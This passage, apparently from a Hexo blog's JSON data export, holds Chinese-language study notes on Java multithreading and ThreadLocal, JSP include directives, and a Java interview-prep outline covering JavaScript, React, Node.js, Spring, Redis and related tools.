map = getMap(t);\n\t    if (map != null) {\n\t\tThreadLocalMap.Entry e = map.getEntry(this);\n\t\tif (e != null)\n\t\t    return (T)e.value;\n\t    }\n\t    return setInitialValue();\n\t}\n\n\n\n　事实上，从本质来讲，就是每个线程都维护了一个map，而这个map的key就是threadLocal，而值就是我们set的那个值，每次线程在get的时候，都从自己的变量中取值。","slug":"Java多线程","published":1,"updated":"2018-01-31T07:05:28.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tvy000pmfah4q804s5y","content":"<h4 id=\"进程与线程的概念理解\"><a href=\"#进程与线程的概念理解\" class=\"headerlink\" title=\"进程与线程的概念理解:\"></a>进程与线程的概念理解:</h4><pre><code>进程:执行的应用程序.\n线程:程序执行的一条路径\n</code></pre><h4 id=\"线程的生命周期以及五中状态\"><a href=\"#线程的生命周期以及五中状态\" class=\"headerlink\" title=\"线程的生命周期以及五中状态\"></a>线程的生命周期以及五中状态</h4><p><img src=\"Java多线程/1.png\" alt=\"javaSE\"></p>\n<h4 id=\"Java线程具有五中基本状态\"><a href=\"#Java线程具有五中基本状态\" class=\"headerlink\" title=\"Java线程具有五中基本状态\"></a>Java线程具有五中基本状态</h4><p><strong>新建状态（New）</strong>：当线程对象对创建后，即进入了新建状态，如：Thread t = new MyThread();</p>\n<p><strong>就绪状态（Runnable）</strong>：当调用线程对象的start()方法（t.start();），线程即进入就绪状态。处于就绪状态的线程，只是说明此线程已经做好了准备，随时等待CPU调度执行，并不是说执行了t.start()此线程立即就会执行；</p>\n<p><strong>运行状态（Running）</strong>：当CPU开始调度处于就绪状态的线程时，此时线程才得以真正执行，即进入到运行状态。注：就     绪状态是进入到运行状态的唯一入口，也就是说，线程要想进入运行状态执行，首先必须处于就绪状态中；</p>\n<p><strong>阻塞状态（Blocked）</strong>：处于运行状态中的线程由于某种原因，暂时放弃对CPU的使用权，停止执行，此时进入阻塞状态，直到其进入到就绪状态，才 有机会再次被CPU调用以进入到运行状态。根据阻塞产生的原因不同，阻塞状态又可以分为三种：</p>\n<pre><code>1.等待阻塞：运行状态中的线程执行wait()方法，使本线程进入到等待阻塞状态；\n\n2.同步阻塞 -- 线程在获取synchronized同步锁失败(因为锁被其它线程所占用)，它会进入同步阻塞状态；\n\n3.其他阻塞 -- 通过调用线程的sleep()或join()或发出了I/O请求时，线程会进入到阻塞状态。当sleep()状态超时、join()等待线程终止或者超时、或者I/O处理完毕时，线程重新转入就绪状态。\n</code></pre><p><strong>死亡状态（Dead）</strong>：线程执行完了或者因异常退出了run()方法，该线程结束生命周期。</p>\n<h4 id=\"java中线程创建的几种形式\"><a href=\"#java中线程创建的几种形式\" class=\"headerlink\" title=\"java中线程创建的几种形式\"></a>java中线程创建的几种形式</h4><p>1.继承Thread类,重写run方法</p>\n<pre><code> class MyThread extends Thread {\n      private int i = 0;\n      @Override\n      public void run() {\n      for (i = 0; i &lt; 100; i++) {\n          System.out.println(Thread.currentThread().getName() + &quot; &quot; + i);\n     }\n     }\n }\n\n\npublic class ThreadTest {\n\n    public static void main(String[] args) {\n    for (int i = 0; i &lt; 100; i++) {\n        System.out.println(Thread.currentThread().getName() + &quot; &quot; + i);\n        if (i == 30) {\n            Thread myThread1 = new MyThread();     // 创建一个新的线程  myThread1  此线程进入新建状态\n            Thread myThread2 = new MyThread();     // 创建一个新的线程 myThread2 此线程进入新建状态\n            myThread1.start();                     // 调用start()方法使得线程进入就绪状态\n            myThread2.start();                     // 调用start()方法使得线程进入就绪状态\n        }\n    }\n    }\n}\n</code></pre><p>2.实现runnable接口,重写run方法</p>\n<pre><code>class MyRunnable implements Runnable {\n    private int i = 0;\n\n    @Override\n    public void run() {\n    for (i = 0; i &lt; 100; i++) {\n        System.out.println(Thread.currentThread().getName() + &quot; &quot; + i);\n    }\n    }\n}\n\n\npublic class ThreadTest {\n\n    public static void main(String[] args) {\n    for (int i = 0; i &lt; 100; i++) {\n        System.out.println(Thread.currentThread().getName() + &quot; &quot; + i);\n        if (i == 30) {\n            Runnable myRunnable = new MyRunnable(); // 创建一个Runnable实现类的对象\n            Thread thread1 = new Thread(myRunnable); // 将myRunnable作为Thread target创建新的线程\n            Thread thread2 = new Thread(myRunnable);\n            thread1.start(); // 调用start()方法使得线程进入就绪状态\n            thread2.start();\n        }\n    }\n    }\n}\n</code></pre><p>理解ThreadLocal:<br>ThreadLocal叫做 线程局部变量,<br>1、每个线程都有自己的局部变量</p>\n<pre><code>每个线程都有一个独立于其他线程的上下文来保存这个变量，一个线程的本地变量对其他线程是不可见的（有前提，后面解释）\n</code></pre><p>2、独立于变量的初始化副本</p>\n<pre><code>ThreadLocal可以给一个初始值，而每个线程都会获得这个初始化值的一个副本，这样才能保证不同的线程都有一份拷贝。\n</code></pre><p>3、状态与某一个线程相关联<br>    ThreadLocal 不是用于解决共享变量的问题的，不是为了协调线程同步而存在，而是为了方便每个线程处理自己的状态而引入的一个机制，理解这点对正确使用ThreadLocal至关重要。</p>\n<p>ThreadLocal实现机制</p>\n<pre><code>/**1、每个Thread对象内部都维护了一个ThreadLocalMap这样一个ThreadLocal的Map，可以存放若干个ThreadLocal。\n\nThreadLocal.ThreadLocalMap threadLocals = null;\n2、当我们在调用get()方法的时候，先获取当前线程，然后获取到当前线程的ThreadLocalMap对象，如果非空，那么取出ThreadLocal的value，否则进行初始化，初始化就是将initialValue的值set到ThreadLocal中。**/\n\npublic T get() {\n    Thread t = Thread.currentThread();\n    ThreadLocalMap map = getMap(t);\n    if (map != null) {\n    ThreadLocalMap.Entry e = map.getEntry(this);\n    if (e != null)\n        return (T)e.value;\n    }\n    return setInitialValue();\n}\n</code></pre><p>　事实上，从本质来讲，就是每个线程都维护了一个map，而这个map的key就是threadLocal，而值就是我们set的那个值，每次线程在get的时候，都从自己的变量中取值。</p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"进程与线程的概念理解\"><a href=\"#进程与线程的概念理解\" class=\"headerlink\" title=\"进程与线程的概念理解:\"></a>进程与线程的概念理解:</h4><pre><code>进程:执行的应用程序.\n线程:程序执行的一条路径\n</code></pre><h4 id=\"线程的生命周期以及五中状态\"><a href=\"#线程的生命周期以及五中状态\" class=\"headerlink\" title=\"线程的生命周期以及五中状态\"></a>线程的生命周期以及五中状态</h4><p><img src=\"Java多线程/1.png\" alt=\"javaSE\"></p>\n<h4 id=\"Java线程具有五中基本状态\"><a href=\"#Java线程具有五中基本状态\" class=\"headerlink\" title=\"Java线程具有五中基本状态\"></a>Java线程具有五中基本状态</h4><p><strong>新建状态（New）</strong>：当线程对象对创建后，即进入了新建状态，如：Thread t = new MyThread();</p>\n<p><strong>就绪状态（Runnable）</strong>：当调用线程对象的start()方法（t.start();），线程即进入就绪状态。处于就绪状态的线程，只是说明此线程已经做好了准备，随时等待CPU调度执行，并不是说执行了t.start()此线程立即就会执行；</p>\n<p><strong>运行状态（Running）</strong>：当CPU开始调度处于就绪状态的线程时，此时线程才得以真正执行，即进入到运行状态。注：就     绪状态是进入到运行状态的唯一入口，也就是说，线程要想进入运行状态执行，首先必须处于就绪状态中；</p>\n<p><strong>阻塞状态（Blocked）</strong>：处于运行状态中的线程由于某种原因，暂时放弃对CPU的使用权，停止执行，此时进入阻塞状态，直到其进入到就绪状态，才 有机会再次被CPU调用以进入到运行状态。根据阻塞产生的原因不同，阻塞状态又可以分为三种：</p>\n<pre><code>1.等待阻塞：运行状态中的线程执行wait()方法，使本线程进入到等待阻塞状态；\n\n2.同步阻塞 -- 线程在获取synchronized同步锁失败(因为锁被其它线程所占用)，它会进入同步阻塞状态；\n\n3.其他阻塞 -- 通过调用线程的sleep()或join()或发出了I/O请求时，线程会进入到阻塞状态。当sleep()状态超时、join()等待线程终止或者超时、或者I/O处理完毕时，线程重新转入就绪状态。\n</code></pre><p><strong>死亡状态（Dead）</strong>：线程执行完了或者因异常退出了run()方法，该线程结束生命周期。</p>\n<h4 id=\"java中线程创建的几种形式\"><a href=\"#java中线程创建的几种形式\" class=\"headerlink\" title=\"java中线程创建的几种形式\"></a>java中线程创建的几种形式</h4><p>1.继承Thread类,重写run方法</p>\n<pre><code> class MyThread extends Thread {\n      private int i = 0;\n      @Override\n      public void run() {\n      for (i = 0; i &lt; 100; i++) {\n          System.out.println(Thread.currentThread().getName() + &quot; &quot; + i);\n     }\n     }\n }\n\n\npublic class ThreadTest {\n\n    public static void main(String[] args) {\n    for (int i = 0; i &lt; 100; i++) {\n        System.out.println(Thread.currentThread().getName() + &quot; &quot; + i);\n        if (i == 30) {\n            Thread myThread1 = new MyThread();     // 创建一个新的线程  myThread1  此线程进入新建状态\n            Thread myThread2 = new MyThread();     // 创建一个新的线程 myThread2 此线程进入新建状态\n            myThread1.start();                     // 调用start()方法使得线程进入就绪状态\n            myThread2.start();                     // 调用start()方法使得线程进入就绪状态\n        }\n    }\n    }\n}\n</code></pre><p>2.实现runnable接口,重写run方法</p>\n<pre><code>class MyRunnable implements Runnable {\n    private int i = 0;\n\n    @Override\n    public void run() {\n    for (i = 0; i &lt; 100; i++) {\n        System.out.println(Thread.currentThread().getName() + &quot; &quot; + i);\n    }\n    }\n}\n\n\npublic class ThreadTest {\n\n    public static void main(String[] args) {\n    for (int i = 0; i &lt; 100; i++) {\n        System.out.println(Thread.currentThread().getName() + &quot; &quot; + i);\n        if (i == 30) {\n            Runnable myRunnable = new MyRunnable(); // 创建一个Runnable实现类的对象\n            Thread thread1 = new Thread(myRunnable); // 将myRunnable作为Thread target创建新的线程\n            Thread thread2 = new Thread(myRunnable);\n            thread1.start(); // 调用start()方法使得线程进入就绪状态\n            thread2.start();\n        }\n    }\n    }\n}\n</code></pre><p>理解ThreadLocal:<br>ThreadLocal叫做 线程局部变量,<br>1、每个线程都有自己的局部变量</p>\n<pre><code>每个线程都有一个独立于其他线程的上下文来保存这个变量，一个线程的本地变量对其他线程是不可见的（有前提，后面解释）\n</code></pre><p>2、独立于变量的初始化副本</p>\n<pre><code>ThreadLocal可以给一个初始值，而每个线程都会获得这个初始化值的一个副本，这样才能保证不同的线程都有一份拷贝。\n</code></pre><p>3、状态与某一个线程相关联<br>    ThreadLocal 不是用于解决共享变量的问题的，不是为了协调线程同步而存在，而是为了方便每个线程处理自己的状态而引入的一个机制，理解这点对正确使用ThreadLocal至关重要。</p>\n<p>ThreadLocal实现机制</p>\n<pre><code>/**1、每个Thread对象内部都维护了一个ThreadLocalMap这样一个ThreadLocal的Map，可以存放若干个ThreadLocal。\n\nThreadLocal.ThreadLocalMap threadLocals = null;\n2、当我们在调用get()方法的时候，先获取当前线程，然后获取到当前线程的ThreadLocalMap对象，如果非空，那么取出ThreadLocal的value，否则进行初始化，初始化就是将initialValue的值set到ThreadLocal中。**/\n\npublic T get() {\n    Thread t = Thread.currentThread();\n    ThreadLocalMap map = getMap(t);\n    if (map != null) {\n    ThreadLocalMap.Entry e = map.getEntry(this);\n    if (e != null)\n        return (T)e.value;\n    }\n    return setInitialValue();\n}\n</code></pre><p>　事实上，从本质来讲，就是每个线程都维护了一个map，而这个map的key就是threadLocal，而值就是我们set的那个值，每次线程在get的时候，都从自己的变量中取值。</p>\n"},{"title":"JSP的静态包含与动态包含","date":"2014-04-21T07:32:06.000Z","_content":"JSP的静态包含:\n\n\t<%@ include file=\"header.jsp\"%>\n静态包含是把所有的片段都复制在一起,在一起翻译,一起编译成一个.class文件\n\n JSP的动态包含:\n \n\t<jsp:include page=\"header.jsp\"></jsp:include>\n动态包含是把每一个jsp都单独翻译,单独编译成独自的.class,然后将运行结果复制在一起对外显示。动态包含会随时监测包含的资源是否有变化,如果有变化,则更新,从新编译。","source":"_posts/JSP的静态包含与动态包含.md","raw":"---\ntitle: JSP的静态包含与动态包含\ndate: 2014-4-21 15:32:06\ntags: JSP\n---\nJSP的静态包含:\n\n\t<%@ include file=\"header.jsp\"%>\n静态包含是把所有的片段都复制在一起,在一起翻译,一起编译成一个.class文件\n\n JSP的动态包含:\n \n\t<jsp:include page=\"header.jsp\"></jsp:include>\n动态包含是把每一个jsp都单独翻译,单独编译成独自的.class,然后将运行结果复制在一起对外显示。动态包含会随时监测包含的资源是否有变化,如果有变化,则更新,从新编译。","slug":"JSP的静态包含与动态包含","published":1,"updated":"2018-01-31T07:33:52.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tvz000smfahbr10bg6b","content":"<p>JSP的静态包含:</p>\n<pre><code>&lt;%@ include file=&quot;header.jsp&quot;%&gt;\n</code></pre><p>静态包含是把所有的片段都复制在一起,在一起翻译,一起编译成一个.class文件</p>\n<p> JSP的动态包含:</p>\n<pre><code>&lt;jsp:include page=&quot;header.jsp&quot;&gt;&lt;/jsp:include&gt;\n</code></pre><p>动态包含是把每一个jsp都单独翻译,单独编译成独自的.class,然后将运行结果复制在一起对外显示。动态包含会随时监测包含的资源是否有变化,如果有变化,则更新,从新编译。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>JSP的静态包含:</p>\n<pre><code>&lt;%@ include file=&quot;header.jsp&quot;%&gt;\n</code></pre><p>静态包含是把所有的片段都复制在一起,在一起翻译,一起编译成一个.class文件</p>\n<p> JSP的动态包含:</p>\n<pre><code>&lt;jsp:include page=&quot;header.jsp&quot;&gt;&lt;/jsp:include&gt;\n</code></pre><p>动态包含是把每一个jsp都单独翻译,单独编译成独自的.class,然后将运行结果复制在一起对外显示。动态包含会随时监测包含的资源是否有变化,如果有变化,则更新,从新编译。</p>\n"},{"title":"Java面试知识点总结","date":"2018-02-01T06:22:30.000Z","_content":"[TOC]\n### JavaSE\n#### 多线程\n\n#### IO流\n#### 反射\n#### 集合\n\n[java基础面试][5]\n\n### 前台框架\n#### JavaScript\n1. **闭包**\n\n\t闭包是JavaScript中的一种语法现象，指的是在函数的内部定义了子函数，并且子函数访问了父函数中的成员变量。定义一个闭包现象如下：\n\t\n\t\tfout = function(){\n\t\t\tvar v1 = 10;\n\t\t\tfin = function(){\n\t\t\t\tvar v2 = v1;\n\t\t\t\treturn v2;\n\t\t\t}\n\t\t\treturn fin;\n\t\t}\n\t\t\n\t\tvar out = fout() //  fin()\n\t\tvar in = out() //  10\n\t通过闭包中的子函数可以访问到父函数中的成员变量但是外部的父函数却不能访问子函数中的成员变量，这就是Javascript语言特有的\"链式作用域\"结构（chain scope），子对象会一级一级地向上寻找所有父对象的变量。所以，父对象的所有变量，对子对象都是可见的，反之则不成立。\n\n\t既然fin可以读取fout中的局部变量，那么只要把fin作为返回值，我们不就可以在fout外部读取它的内部变量了吗！\n\n\n\n2.  **JavaScript 中 undefined 和 not defined 的区别:**\n\tundefined是javaScript中的一种原始数据类型，表示没有初始化的变量或者函数的初始化值。如果一个变量或者函数只定义了，而没有初始化，则用typeof会返回一个undefined。\n\n\t\tvar val;\n\t\talert(typeof val) // undefined\n\t\t\n\tnot defined是一种错误提示消息，表示变量没有定义过就使用了，如下：\n\t\t\n\t\tvar val = x; // x会报错: Unresolved variable or type x\n\n3. **全局对象**\n\tJavaScript的全局对象是指，该语言中的内置对象，这些对象可以在javaScript代码的任何位置不用声明就可以直接使用，类似Java中的基本类型数据。\n\t常用到的全局对象有：\n\t\n\t\teval(String)：接受一个字符串参数，用于执行字符串代码。\n\t\ttypeof： 返回一个变量的数据类型。\n\t\tNumber() ：把对象的值转换为数字。\n\t\tString()： 把对象的值转换为字串。\n\t\tparseInt(String)：解析一个字符串并返回一个整数。\n\t\tparseFloat(String)：解析一个字符串并返回一个浮点数。\n\t\tdecodeURI()：解码某个编码的 URI。\n\t\tdecodeURIComponent()：解码一个编码的 URI 组件。\n\t\tencodeURI()：把字符串编码为 URI。\n\t下面面试题输出的结果是甚末？\n\t\n\t\tvar y = 1;\n\t\tif (function f(){}) {\n\t\t    y += typeof f;\n\t\t}\n\t\tconsole.log(y);\n\t输出结果：1undefined\n\t\n4. **怎么判断一个object是否是数组(array)？**\n\n\t\tobject.__proto__ === Array.prototype; // 利用原型链\n\t\t\n\t\t$.isArray(object) // 利用jQuery\n\n5. **JavaScript怎么清空数组？**\n\n\t\tvar arr = [1, 2, 3, 4, 5];\n\t\tarr = []; // 方法一\n\t\tarr.length = 0; // 方法二 \n6. **JavaScript中自执行匿名函数**\t\n\n\t自执行匿名函数定义：\n\t常见格式：(function() { /* code */ })();\n\t解释：包围函数（function(){})的第一对括号向脚本返回未命名的函数，随后一对空括号立即执行返回的未命名函数，括号内为匿名函数的参数。\n\t作用：可以用它创建命名空间，只要把自己所有的代码都写在这个特殊的函数包装内，那么外部就不能访问，除非你允许(变量前加上window，这样该函数或变量就成为全局)。各JavaScript库的代码也基本是这种组织形式。\n\t\n\t总结一下，执行函数的作用主要为 匿名 和 自动执行,代码在被解释时就已经在运行了。\n\t\n\t下面代码输出的结果是甚末？\n\t\n\t\tvar output = (function(x){\n\t\t    delete x;\n\t\t    return x;\n\t\t})(0);\n\t\tconsole.log(output);\n输出是 0。 [delete][2] 操作符是将object的属性删去的操作。但是这里的 x 是并不是对象的属性， delete 操作符并不能作用。\n\n7. **什么是 undefined x 1 ？**\n\t在chrome下执行如下代码，我们就可以看到undefined x 1的身影。\n\t\n\t\tvar trees = [\"redwood\",\"bay\",\"cedar\",\"oak\",\"maple\"];\n\t\tdelete trees[3];\n\t\tconsole.log(trees);\n\t\t\n\t当我们使用 delete 操作符删除一个数组中的元素，这个元素的位置就会变成一个占位符。打印出来就是undefined x 1。\n\t注意如果我们使用trees\\[3] === 'undefined × 1'返回的是 false。因为它仅仅是一种打印表示，并不是值变为undefined x 1。\n\t\n8. **下面代码输出什么？**\n\n\t\tvar bar = true;\n\t\tconsole.log(bar + 0);   \n\t\tconsole.log(bar + \"xyz\");  \n\t\tconsole.log(bar + true);  \n\t\tconsole.log(bar + false);   \n\t输出是:\n\t1\n\ttruexyz\n\t2\n\t1\n\t\n\t下面给出一个加法操作表:\n\tNumber + Number -> 加法\n\tBoolean + Number -> 加法\n\tBoolean + Boolean -> 加法\n\tNumber + String -> 连接\n\tString + Boolean -> 连接\n\tString + String -> 连接\n\n9. **两种函数声明有什么区别？**\n\n\t\tvar foo = function(){ \n\t\t    // Some code\n\t\t}; \n\t\tfunction bar(){ \n\t\t    // Some code\n\t\t}; \n\t第一种函数定义是在运行时；第二种定义实在解析时，存在变量提升。看看如下代码的运行结果：\n\t\n\t\tconsole.log(foo)\n\t\tconsole.log(bar)\n\n\t\tvar foo = function(){ \n\t\t    // Some code\n\t\t}; \n\t\tfunction bar(){ \n\t\t    // Some code\n\t\t}; \n\t结果是：\n\t\t\n\t\tundefined\n\t\tfunction bar(){ \n\t\t    // Some code\n\t\t};\n\t第二种方式JavaScript在执行时，会将变量提升。\n\t\n10. [**JavaScript 变量提升**][3]\n\tJavaScript 中，函数及变量的声明都将被提升到函数的最顶部。\n\tJavaScript 中，变量可以在使用后声明，也就是变量可以先使用再声明。\n\t\n11. **内存泄漏**\n\t内存泄露是指变量使用完之后没有被销毁，一直常驻内存，无法被垃圾回收器回收导致的内存浪费，严重的时候会导致内存溢出。引发内存泄露的原因通常是因为不规范编码造成的。一般有一下几种现象：\n\t全局变量引起的内存泄漏：\n\t\n\t\tfunction leaks(){  \n\t\t    leak = 11; // leak 成为一个全局变量，方法执行完成之后，不会被回收\n\t\t}\n\t闭包引起的内存泄漏：\n\t\n\t\tfunction leaks(){\n\t\t\tlet leak = 11; // 被闭包所引用，不会被回收\n\t\t\tfunction fin() {\n\t\t\t\tconsole.log(leak); \n\t\t\t}\n\t\t\treturn fin();\n\t\t}\n\t事件未清除导致的内存泄漏\n\t\n#### jQuery\n1. **Ajax**\n\t简述ajax 的过程。\n\t\n\t- 创建XMLHttpRequest对象,也就是创建一个异步调用对象\n\t- 创建一个新的HTTP请求,并指定该HTTP请求的方法、URL及验证信息\n\t- 设置响应HTTP请求状态变化的函数\n\t- 发送HTTP请求\n\t- 获取异步调用返回的数据\n\t- 使用JavaScript和DOM实现局部刷新\n\t\n同步和异步的区别?\nsyn\n如何解决跨域问题?\n\nJavaScript 的同源策略\n\n\t同源策略是客户端脚本（尤其是Javascript）的重要的安全度量标准。它最早出自Netscape Navigator2.0，其目的是防止某个文档或脚本从多个不同源装载。所谓同源指的是：协议，域名，端口相同，同源策略是一种安全协议，指一段脚本只能读取来自同一来源的窗口和文档的属性。\n解释jsonp的原理，以及为什么不是真正的ajax\n\n\tJsonp并不是一种数据格式，而json是一种数据格式，jsonp是用来解决跨域获取数据的一种解决方案，具体是通过动态创建script标签，然后通过标签的src属性获取js文件中的js脚本，该脚本的内容是一个函数调用，参数就是服务器返回的数据，为了处理这些返回的数据，需要事先在页面定义好回调函数，本质上使用的并不是ajax技术\n#### React\n1. **简介**\n\n\tReact是Facebook2013年开源的一个JavaScript项目，是用来构建UI界面的，相当于MVC模型中View层。React 拥有较高的性能，代码逻辑非常简单，越来越多的人已开始关注和使用它。\n\n2. **React主要的原理**\n\n\t传统的web应用，操作DOM一般是直接更新操作的，但是我们知道DOM更新通常是比较昂贵的。而React为了尽可能减少对DOM的操作，提供了一种不同的而又强大的方式来更新DOM，代替直接的DOM操作。就是Virtual DOM,一个轻量级的虚拟的DOM，就是React抽象出来的一个对象，描述dom应该什么样子的，应该如何呈现。通过这个Virtual DOM去更新真实的DOM，由这个Virtual DOM管理真实DOM的更新。\n\n\t为什么通过这多一层的Virtual DOM操作就能更快呢？ 这是因为React有个diff算法，更新Virtual DOM并不保证马上影响真实的DOM，React会等到事件循环结束，然后利用这个diff算法，通过当前新的dom表述与之前的作比较，计算出最小的步骤更新真实的DOM。\n\n3. **特点：**\n\t- 不直接操作DOM对象，而是通过虚拟DOM通过diff算法以最小的步骤作用到真实的DOM上；\n\t- 组件化开发，代码的复用性高；\n\t- 异步更新页面，不用刷新整个页面；\n4. **state, props, refs, keys的作用：**\n\t- state: 是React中组件的一个对象。React把用户界面当做是状态机，想象它有不同的状态然后渲染这些状态,可以轻松让用户界面与数据保持一致。 React中,更新组件的state,会导致重新渲染用户界面(不要操作DOM).简单来说,就是用户界面会随着state变化而变化。调用setState(data,callback)这个方法会合并、更新data到this.state，并重新渲染组件。渲染完成后，调用可选的callback回调。大部分情况不需要提供callback，因为React会负责吧界面更新到最新状态。\n\t\n\t- props: 用来从父级组件向子集组件传递参数的容器。React 里，数据通过props 从拥有者流向归属者。\n\n\t- ref: 是React中的一个特殊属性，这个属性用在render()方法返回的组件上，用来标记组件，以便于获取到该组件的实例。\n\tref的形式如下：\n\t```\n\t<input ref=\"myInput\" />\n\t```\n\t\t\n\t\t要想访问这个实例，可以通过this.refs来访问：\n\n\t\t\tthis.refs.myInput\n \n \t- key: 它是一个特殊的属性，它是出现不是给开发者用的（例如你为一个组件设置key之后不能获取组件的这个key props），而是给react自己用的。react利用key来识别组件，它是一种身份标识标识，就像我们的身份证用来辨识一个人一样。每个key对应一个组件，相同的key react认为是同一个组件，这样后续相同的key对应组件都不会被创建。\n \tkey值的唯一是有范围的，即在数组生成的同级同类型的组件上要保持唯一，而不是所有组件的key都要保持唯一。不仅仅在数组生成组件上，其他地方也可以使用key，主要是react利用key来区分组件的，相同的key表示同一个组件，react不会重新销毁创建组件实例，只可能更新；key不同，react会销毁已有的组件实例，重新创建组件新的实例。\n \t\n5. **定义一个组件：**\n\n\t\timport React from \"react\";\n\t\timport {Row,Col} from \"antd\";\n\t\timport \"antd/dist/antd.css\";\n\n\t\texport default class PCFooter extends React.Component{\n\t\t    render(){\n\t\t    \n\t\t\t\treturn(\n\t\t\t\t    <footer className={\"footer\"}>\n\t\t\t\t\t<Row>\n\t\t\t\t\t    <Col span={2}></Col>\n\t\t\t\t\t    <Col span={20}>\n\t\t\t\t\t\t<p>&copy;&nbsp;2017-2050 ReactNews CopyRight Reserved.</p>\n\t\t\t\t\t    </Col>\n\t\t\t\t\t    <Col span={2}></Col>\n\t\t\t\t\t</Row>\n\t\t\t\t    </footer>\n\t\t\t\t);\n\t\t    };\n\t\t}\n\n6. **AntD**\n\tAnt Design是蚂蚁金服开发的一款前端UI框架，可以帮助开发者快速搭建漂亮的页面，即使你是一个不懂设计的开发者，也能快速地写出比较好看的前端页面。从而提高了页面的开发效率。与React结合开发前端页面效果不错。\n7. **开发流程**\n\t- 导入需要的模块；\n\t- 定义一个组件，继承React.Component，用到关键字export, default, class, extends\n\t- 编写构造器（可选，用于初始化参数）;\n\t- 编写render()方法，用于渲染组件；\n\t- 编写render()方法中的return()方法，返回组件；\n\t- 在其他组件中导入编写的组件，用props进行参数传递。\n\t\n8. **NodeJS**\n\n\t简单的说 Node.js 就是运行在服务端的 JavaScript。自从前后端开发分离之后，前端代码从后段代码中剥离出来了，搭建独立的前端服务器，Node.JS就是前端项目服务器, 类似Tomcat、Apache、Nginx。\n\tNode.Js采用NPM对前端项目中的依赖JS包进行管理，在新版本中NPM已经包含在了Node.js中，用户只需要安装Node即可，不需要额外安装NPM。\n\t\n\t接下来我们使用 http.createServer() 方法创建服务器，并使用 listen 方法绑定 8888 端口。 函数通过 request, response 参数来接收和响应数据。\n\n实例如下，在你项目的根目录下创建一个叫 server.js 的文件，并写入以下代码：\n\n\tvar http = require('http');\n\n\thttp.createServer(function (request, response) {\n\n\t    // 发送 HTTP 头部 \n\t    // HTTP 状态值: 200 : OK\n\t    // 内容类型: text/plain\n\t    response.writeHead(200, {'Content-Type': 'text/plain'});\n\n\t    // 发送响应数据 \"Hello World\"\n\t    response.end('Hello World\\n');\n\t}).listen(8888);\n\n\t// 终端打印如下信息\n\tconsole.log('Server running at http://127.0.0.1:8888/');\n\t以上代码我们完成了一个可以工作的 HTTP 服务器。\n\n\t使用 node 命令执行以上的代码：\n\n\tnode server.js\n\tServer running at http://127.0.0.1:8888/\n\t\n\t\n9. **NPM**\n\t\n\t- npm init：会引导你创建一个package.json文件，包括名称、版本、作者这些信息等\n\t- npm install moduleNames：安装Node模块\n\t- npm install <name> -g： 将包安装到全局环境中\n\t- npm install <name> --save： 安装的同时，将信息写入package.json中项目路径中（如果有package.json文件时，直接使用npm install方法就可以根据dependencies配置安装所有的依赖包，这样代码提交到github时，就不用提交node_modules这个文件夹了）。\n\t- npm uninstall moudleName：卸载node模块\n\t- npm update moduleName：更新node模块\n\t- npm list：查看当前目录下已安装的node包\n\t- npm -v：查看npm安装的版本\n\t\n### 后台框架\n#### SpringMvc\n1. SpringMVC的工作流程？\n\n\t- 客户端发起请求到DispatcherServlet(前端控制器)；\n\t- 调用HandlerMapping(处理器映射器)，根据请求中的url到xml配置或注解(@RequestMapping)中去进行查找对应的Handler(处理器)；\n\t```\n\t<bean name=\"/url\" class=\"com.example.controller.Controller\"></bean> \n\t```\n\t- HandlerMapping 生成HandlerIntercepter(处理器拦截器)，将其和Handler一并返回给前端控制器；\n\t\n2. SpringMVC和Struts2的区别：\n3. \n#### Spring\n#### Mybatis\n#### Struts2\n#### Hibernate\n#### SpringBoot\n\n### 服务器\n#### Tomcat\n#### Nginx\n1. 简介\n2. Http服务器\n3. 负载均衡服务器\n[Nginx负载均衡的详细配置及使用案例详解.][4]\n4. 反向代理服务器\n\n\n### 数据库\n#### MySQL\n1. **Sql优化**\n2. **锁**\n\t死锁\n\t锁策略\n\t锁粒度\n\t\t表级锁\n\t\t行级锁\n3. **事务**\n\t原子性\n\t一致性\n\t持久性\n\t隔离性\n\t\t脏读\n\t\t不可重复读\n\t\t虚度/幻读\n\t\t序列化\n#### Redis\n1. **数据类型**\nRedis支持五种数据类型：string（字符串），hash（哈希），list（列表），set（集合）及zset(sorted set：有序集合)。\n2. **Jedis**\n\n3. **Redis与**\n\n4. **Redis的应用场景**\n\t- 缓存\n\t\tRedis读写速度每秒在10万次左右，可以对查询频繁的数据进行缓存，能实现高效的查询。\n\t- 技术器\n\t\t使用INCREABY和DECREABY可以实现计数器\n\t- 分布式锁与单线程 \n\t\tRedis是单线程的所以可以控制多线程并发访问资源的问题\n\t- 计时器\n\t\tRedis新版本推出了key过期事件，可以通过订阅指定的key事件来实现定时任务，但这是新版本的特性。\n#### MongoDB\n1. **数据类型**\n2. **JavaAPI**\n### 技术点\n#### Dubbo\nDubbo是阿里开源的一款微服务框架，可以与Spring整合实现分布式应用之间服务的管理。\nDubbo四个组件组成：\n- 生产者：服务的提供者；\n- 消费者：服务的订阅者；\n- 注册中心：用于服务的发布和订阅；\n\t通常使用Zookeeper作为注册中心，因为Zookeeper可以通过节点进行订阅和发布数据。\n- 监控中心：用于服务的监控和管理。\n#### ActiveMQ\n\n#### Zookeeper\n\t\n\t- Zookeeper最初时应用在大数据中的，被用于分布式系统中用于维护分布式应用配置的一致性。\n\t- 作为Dubbo的注册中心\n\t- 作为项目的配置中心\n\t首先动态加载相关bean，如果配置中心发生改变，对应的watcher监听到事件后，客户端则对相关bean进行重新注册，并且从配置中心获取到了最新数据，然后客户端直接调用getBean()方法获取相关bean实例，确保不再是之前引用。\n#### Freemarker\n#### SwaggerAPI\n#### Solr\n#### FastDFS\n#### 定时任务框架\n1. **JDK**\n2. **Spring-Task**\n3. **Quartz**\n4. [**Elestic Job**][1]\n5. **Zookeeper**\n\t\n#### WebService（CXF）\n#### Shiro\n\n### 开发工具\n#### IDEA\n#### PostMan\n#### Charles\n#### Datagrid\n#### Ubuntu\n#### GIT\n\n### 加分项\n#### Kotlin\n\n- 防止空指针\n- Kotlin文件类型有class, object, menu, interface\n- 伴生对象对应java中的static\n- 但例采用object \n- 高阶函数\n- Lambda表达式\n- 详见博客《Kotlin基础语法》\n#### Vertx\n- EvenBus异步执行，提高执行效率\n- 使用多层嵌套解决同步问题\n- 使用标签跳出指定层\n#### Python\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[1]: http://blog.csdn.net/fanfan_v5/article/details/61310045\n[2]: 